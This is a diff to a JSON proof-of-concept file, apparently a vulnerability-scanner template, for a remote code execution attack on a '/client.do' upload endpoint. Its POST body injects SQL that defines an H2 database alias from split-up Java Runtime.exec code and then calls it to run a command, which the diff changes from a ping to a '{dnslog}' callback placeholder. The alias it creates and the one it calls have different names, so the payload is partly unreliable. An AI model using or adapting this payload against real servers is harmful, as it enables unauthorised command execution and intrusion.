@@ -4,12 +4,12 @@
   "type":"exec",
   "poc": {
     "pocGet": "/client.do",
-    "pocPost": "method=getupload&uploadID=1';CREATE ALIAS cs24083 AS CONCAT('void e(String cmd) throws java.io.IOException{','java.lan','g.Run','time rt=java.la','ng.Ru','ntime.getRu','ntime();rt.ex','ec(cmd);}');CALL cs24081('ping www.baidu.com');select '1",
+    "pocPost": "method=getupload&uploadID=1';CREATE ALIAS cs24083 AS CONCAT('void e(String cmd) throws java.io.IOException{','java.lan','g.Run','time rt=java.la','ng.Ru','ntime.getRu','ntime();rt.ex','ec(cmd);}');CALL cs24081('{dnslog}');select '1",
     "header": {
       "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",
       "Cache-Control": "max-age=0",
       "Upgrade-Insecure-Requests": "1",
-      "content-type": " application/x-www-form-urlencoded",
+      "content-type": " application/x-www-form-urlencoded; charset=UTF-8",
       "User-Agent": "Mozilla/5.0 (Linux;",
       "Accept-Encoding": "gzip, deflate",
       "Accept": "*/*",
@@ -17,7 +17,7 @@
       "DNT": "1",
       "Referer": "https://www.google.com/"
     },
-    "Pattern": ""
+    "Pattern": "()"
   },
   "exp": {
     "step1": {
@@ -27,7 +27,7 @@
         "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",
         "Cache-Control": "max-age=0",
         "Upgrade-Insecure-Requests": "1",
-        "content-type": " application/x-www-form-urlencoded",
+        "content-type": " application/x-www-form-urlencoded; charset=UTF-8",
         "User-Agent": "Mozilla/5.0 (Linux;",
         "Accept-Encoding": "gzip, deflate",
         "Accept": "*/*",
